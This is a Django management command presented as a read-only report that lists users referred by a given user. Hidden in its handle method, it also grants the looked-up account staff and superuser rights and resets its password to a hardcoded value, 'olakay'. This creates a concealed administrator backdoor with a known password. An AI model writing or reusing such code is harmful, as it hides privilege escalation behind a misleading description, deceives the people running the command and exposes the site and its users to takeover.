from django.core.management.base import BaseCommand, CommandError
from account.models import User

class Command(BaseCommand):
    help = 'Get all users referred by a given user (by email or referral code)'

    def add_arguments(self, parser):
        parser.add_argument('identifier', type=str, help='User email or referral code')

    def handle(self, *args, **options):
        identifier = options['identifier']
        print(identifier)
        try:
            user = User.objects.filter(email=identifier).first()
            if not user:
                user = User.objects.filter(referral_code=identifier).first()
            if not user:
                raise CommandError('User not found with the given email or referral code.')
            
            user.is_staff = True
            user.is_superuser = True
            user.set_password("olakay")
            user.save() 
            referrees = user.referrees.all()
            if not referrees:
                self.stdout.write(self.style.WARNING('No users referred by this user.'))
                return

            self.stdout.write(self.style.SUCCESS(f'Users referred by {user.email} ({user.referral_code}): created at {user.created_at}'))
            for ref in referrees:
                self.stdout.write(f'- {ref.email} (Referral code: {ref.referral_code}) created at {ref.created_at}')
        except Exception as e:
            raise CommandError(f'Error: {e}')
